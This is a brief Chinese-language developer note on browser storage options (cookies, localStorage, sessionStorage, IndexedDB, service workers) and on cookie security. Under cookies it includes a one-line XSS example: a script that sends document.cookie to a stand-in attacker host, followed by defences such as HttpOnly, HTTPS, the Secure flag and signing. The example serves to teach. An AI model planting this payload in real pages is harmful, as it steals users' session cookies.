// 在浏览器中，如何缓存数据
// - cookie 4KB  每次都会带上 影响http性能
    // XXS 跨站脚本攻击
    <script>
        fetch('http://wwww.haike.com?cookie='+document.cookie)
    </script>

    http only

    - 更安全？
        https
        Secure 更加安全 非HTTPS连接发送cookie
        签名 
// - localStorage/sessionStorage 5MB
// - indexedDB 前端数据库 更大 支持复杂操作 事务
// - service worker 离线存储

